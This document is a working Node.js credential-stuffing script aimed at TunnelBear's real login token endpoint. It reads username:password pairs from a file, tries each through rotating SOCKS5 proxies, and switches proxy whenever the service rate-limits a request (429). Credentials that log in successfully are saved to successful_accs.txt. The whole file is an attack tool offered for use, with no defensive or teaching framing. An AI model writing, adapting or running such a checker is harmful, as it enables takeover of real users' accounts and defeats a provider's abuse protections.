/*
This script is able to read from accs.txt and use a proxy rotation.
You can use any proxy, but the proxy.txt must be in socks5h:// format or socks5://
It tests the account to check if it can be logged in, and saves to successful_accs.txt
*/

// npm install axios socks-proxy-agent
const fs = require('fs');
const axios = require('axios');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { randomUUID } = require('crypto');

const url = 'https://prod-api-dashboard.tunnelbear.com/dashboard/web/v2/token';
const headers = {
  'Content-Type': 'application/json',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36'
};

const delayMs = 1000;
const successFile = 'successful_accs.txt';

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function readAccounts(filePath) {
  try {
    const data = fs.readFileSync(filePath, 'utf-8');
    return data
      .split('\n')
      .map(line => line.trim())
      .filter(Boolean)
      .map(line => {
        const [username, password] = line.split(':');
        return { username, password };
      });
  } catch (err) {
    console.error('❌ Failed to read accs.txt:', err.message);
    return [];
  }
}

function readProxies(filePath) {
  try {
    const data = fs.readFileSync(filePath, 'utf-8');
    return data
      .split('\n')
      .map(p => p.trim())
      .filter(p => p.startsWith('socks5h://'));
  } catch (err) {
    console.error('❌ Failed to read proxies.txt:', err.message);
    return [];
  }
}

async function tryLoginWithProxies(account, proxies) {
  for (let i = 0; i < proxies.length; i++) {
    const proxy = proxies[i];
    const agent = new SocksProxyAgent(proxy);
    const deviceId = randomUUID();

    const payload = {
      device: deviceId,
      grant_type: 'password',
      username: account.username,
      password: account.password
    };

    try {
      const response = await axios.post(url, payload, {
        headers,
        httpAgent: agent,
        httpsAgent: agent,
        timeout: 15000
      });

      if (response.data?.access_token) {
        console.log(`✅ Success: ${account.username}`);
        fs.appendFileSync(successFile, `${account.username}:${account.password}\n`);
        return true;
      } else {
        console.log(`⚠️ No token for ${account.username} on proxy ${proxy}`);
      }

    } catch (err) {
      if (err.response?.status === 429) {
        console.warn(`⚠️ 429 Rate limited for ${account.username} on proxy ${proxy}. Trying next proxy...`);
      } else {
        console.warn(`⚠️ Error with proxy ${proxy} for ${account.username}: ${err.message}`);
      }
    }

    await sleep(250);
  }

  console.error(`❌ Failed all proxies for ${account.username}`);
  return false;
}

async function main() {
  const accounts = readAccounts('accs.txt');
  const proxies = readProxies('proxy.txt');

  if (accounts.length === 0 || proxies.length === 0) {
    console.error('⛔ No accounts or proxies loaded. Exiting.');
    return;
  }

  for (const account of accounts) {
    await tryLoginWithProxies(account, proxies);
    console.log(`⏱ Waiting ${delayMs}ms...\n`);
    await sleep(delayMs);
  }

  console.log('✅ Done testing all accounts.');
}

main();
